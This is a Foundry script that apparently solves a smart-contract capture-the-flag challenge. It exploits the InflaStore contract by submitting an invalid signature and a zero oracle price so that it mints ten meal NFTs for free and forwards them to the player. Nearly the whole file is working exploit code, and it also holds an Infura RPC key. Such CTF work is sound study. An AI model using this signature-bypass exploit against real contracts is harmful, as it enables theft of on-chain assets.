// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/ChallengeMetaverseSupermarket.sol";

contract MetaverseSupermarketTest is Script {
    Meal meal;
    address player;
    uint256 constant mealsToSteal = 10;

    /**
    To run script:

    forge script ./script/MetaverseSupermarket.s.sol --private-key $PRIVATE_KEY --broadcast --rpc-url "https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" -vvv -s "run(address,address)" --retries 1 PLAYER_ADDRESS INSTANCE_ADDRESS
     */
    function run(address _player, address _instance) external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // SETUP
        player = _player;
        InflaStore inflaStore = InflaStore(_instance);
        meal = inflaStore.meal();

        // Attack
        Signature memory invalidSignature = Signature({v: 27, r: 0, s: 0});
        OraclePrice memory fakePrice = OraclePrice({
            blockNumber: block.number,
            price: 0
        });
        for (uint256 i; i < mealsToSteal; ++i) {
            inflaStore.buyUsingOracle(fakePrice, invalidSignature);
        }

        // Check attack success
        require(_isComplete(), "ATTACK FAILED");
        vm.stopBroadcast();
    }

    function onERC721Received(
        address _to,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        // Transfer received meals to player
        meal.transferFrom(address(this), player, _tokenId);
        return this.onERC721Received.selector;
    }

    ///////////
    // HELPERS
    ///////////
    function _isComplete() internal view returns (bool) {
        return meal.balanceOf(player) >= 10;
    }
}
